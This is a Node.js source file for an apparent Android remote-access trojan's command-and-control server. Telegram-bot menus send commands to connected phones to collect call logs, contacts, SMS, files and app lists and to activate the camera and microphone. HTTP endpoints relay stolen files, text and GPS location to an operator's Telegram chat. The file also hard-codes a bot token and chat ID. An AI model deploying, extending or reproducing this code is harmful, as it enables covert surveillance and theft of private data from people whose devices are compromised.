require('dotenv').config();
const socket = require('ws');
const http = require('http');
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const bodyParser = require('body-parser');
const { v4: uuid } = require('uuid');
const axios = require('axios');

const upload = multer();
const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const server = http.createServer(app);
const wss = new socket.Server({ server });

// Environment variables
const chatId = process.env.TELEGRAM_CHAT_ID || '6508791739';
const token = process.env.TELEGRAM_BOT_TOKEN || '8685714612:AAExAnUcsLTMdlmAMnCwne1xs3wY1IP-iyQ';
const serverAddr = process.env.SERVER_ADDR || '';
const PORT = process.env.PORT || 9000;

// Validate token
if (!token || token === '8685714612:AAExAnUcsLTMdlmAMnCwne1xs3wY1IP-iyQ') {
  console.error('⚠️ WARNING: Using default token. Please set TELEGRAM_BOT_TOKEN in .env');
}

let bot;
try {
  bot = new TelegramBot(token, { polling: true });
  console.log('✅ Telegram Bot initialized');
} catch (error) {
  console.error('❌ Failed to initialize Telegram Bot:', error.message);
  process.exit(1);
}

// Error handler for bot
bot.on('polling_error', (error) => {
  console.error('Bot polling error:', error);
});

// Routes
app.get('/', (req, res) => {
  res.send('✅ Server is running');
});

app.post('/sendFile', upload.single('file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).send('No file provided');
    }
    const filename = req.file.originalname;
    bot.sendDocument(chatId, req.file.buffer, {}, { 
      filename: filename, 
      contentType: 'application/octet-stream' 
    }).catch(err => console.error('Error sending file:', err));
    
    res.send(filename);
  } catch (error) {
    console.error('Upload error:', error);
    res.status(500).send('Upload failed');
  }
});

app.post('/sendText', (req, res) => {
  try {
    const text = req.body.text;
    if (!text) {
      return res.status(400).send('No text provided');
    }
    bot.sendMessage(chatId, text, { parse_mode: 'HTML' })
      .catch(err => console.error('Error sending message:', err));
    
    res.send(text);
  } catch (error) {
    console.error('Send text error:', error);
    res.status(500).send('Failed to send text');
  }
});

app.post('/sendLocation', (req, res) => {
  try {
    const { l1, l2 } = req.body;
    if (!l1 || !l2) {
      return res.status(400).send('Missing latitude or longitude');
    }
    bot.sendLocation(chatId, l1, l2)
      .catch(err => console.error('Error sending location:', err));
    
    res.send(`Location sent: ${l1}, ${l2}`);
  } catch (error) {
    console.error('Location error:', error);
    res.status(500).send('Failed to send location');
  }
});

// WebSocket connection handler
wss.on('connection', (ws, req) => {
  const clientId = uuid();
  ws.uuid = clientId;
  
  const clientIp = req.socket.remoteAddress || 'Unknown';
  console.log(`✅ Client connected: ${clientId} (${clientIp})`);
  
  bot.sendMessage(chatId, 
    `<b>🟢 New Device Connected</b>\n\n<b>ID:</b> <code>${clientId}</code>\n<b>IP:</b> ${clientIp}`, 
    { parse_mode: 'HTML' }
  ).catch(err => console.error('Telegram notification error:', err));

  ws.isAlive = true;
  
  ws.on('pong', () => {
    ws.isAlive = true;
  });

  ws.on('message', (data) => {
    console.log(`📨 Message from ${clientId}:`, data.toString());
  });

  ws.on('close', () => {
    console.log(`❌ Client disconnected: ${clientId}`);
  });

  ws.on('error', (error) => {
    console.error(`WebSocket error for ${clientId}:`, error.message);
  });

  ws.send('Connected to server');
});

// Keep-alive ping every 30 seconds
setInterval(() => {
  wss.clients.forEach(ws => {
    if (ws.isAlive === false) {
      return ws.terminate();
    }
    ws.isAlive = false;
    ws.ping();
  });
}, 30000);

// Bot message handler
bot.on('message', (msg) => {
  try {
    const chatId_msg = msg.chat.id;
    const text = msg.text || '';

    if (text === '/start') {
      bot.sendMessage(chatId_msg, 'Welcome to Device Control Bot', {
        reply_markup: {
          keyboard: [['Status ⚙'], ['Action ☄']],
          resize_keyboard: true
        }
      });
    }

    if (text === 'Status ⚙') {
      const clientsCount = wss.clients.size;
      let status = '';
      
      if (clientsCount > 0) {
        status += `<b>${clientsCount} Online Device(s) ✅</b>\n\n`;
        wss.clients.forEach(ws => {
          status += `<code>${ws.uuid}</code>\n`;
        });
      } else {
        status += '<b>No Online Device ❌</b>';
      }
      
      bot.sendMessage(chatId_msg, status, { parse_mode: 'HTML' });
    }

    if (text === 'Action ☄') {
      const clientsCount = wss.clients.size;
      
      if (clientsCount > 0) {
        const keyboard = [
          [{ text: 'Call Log 📞', callback_data: 'cl' }, { text: 'Contacts 👤', callback_data: 'gc' }],
          [{ text: 'SMS 💬', callback_data: 'ss' }, { text: 'Apps 📲', callback_data: 'ia' }],
          [{ text: 'Device Info 📱', callback_data: 'dm' }, { text: 'Files 📄', callback_data: 'gf' }],
          [{ text: 'Camera 📷', callback_data: 'cam1' }, { text: 'Mic 🎤', callback_data: 'mi1' }]
        ];
        
        wss.clients.forEach(ws => {
          bot.sendMessage(chatId_msg, 
            `<b>Select Action</b>\n<code>${ws.uuid}</code>`, 
            {
              reply_markup: { inline_keyboard: keyboard },
              parse_mode: 'HTML'
            });
        });
      } else {
        bot.sendMessage(chatId_msg, '<b>No Online Device ❌</b>', { parse_mode: 'HTML' });
      }
    }
  } catch (error) {
    console.error('Message handler error:', error);
  }
});

// Bot callback query handler
bot.on('callback_query', (query) => {
  try {
    const callbackData = query.data;
    const messageText = query.message.text || '';
    const uuidMatch = messageText.match(/`([^`]+)`/);
    const deviceId = uuidMatch ? uuidMatch[1] : null;

    if (!deviceId) {
      bot.answerCallbackQuery(query.id, { text: '❌ Device not found' });
      return;
    }

    wss.clients.forEach(ws => {
      if (ws.uuid === deviceId && ws.readyState === socket.OPEN) {
        ws.send(callbackData);
      }
    });

    bot.answerCallbackQuery(query.id, { text: '✅ Command sent' });
  } catch (error) {
    console.error('Callback query error:', error);
    bot.answerCallbackQuery(query.id, { text: '❌ Error processing command' });
  }
});

// Handle uncaught errors
process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ Unhandled Rejection:', reason);
});

process.on('uncaughtException', (error) => {
  console.error('❌ Uncaught Exception:', error);
});

// Start server
server.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔════════════════════════════════╗
║  🚀 Server Started Successfully║
║  Port: ${PORT}
║  Environment: ${process.env.NODE_ENV || 'development'}
╚════════════════════════════════╝
  `);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully...');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});
